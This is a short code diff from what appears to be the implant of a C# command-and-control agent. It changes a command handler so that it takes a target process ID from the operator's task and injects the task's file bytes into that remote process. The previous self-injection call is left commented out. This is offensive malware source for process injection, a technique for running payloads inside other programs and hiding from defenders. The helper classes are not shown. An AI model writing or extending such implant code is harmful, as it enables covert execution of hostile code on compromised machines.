@@ -9,8 +9,14 @@ namespace Agent.Commands
 
         public override string Execute(AgentTask task)
         {
-            var injector = new SelfInjector();
-            var success = injector.Inject(task.FileBytes);
+            if (!int.TryParse(task.Arguments[0], out var pid))
+                return "Failed to parse PID";
+
+            var injector = new RemoteInjector();
+            var success = injector.Inject(task.FileBytes, pid);
+
+            //var injector = new SelfInjector();
+            //var success = injector.Inject(task.FileBytes);
 
             if (success)
             {
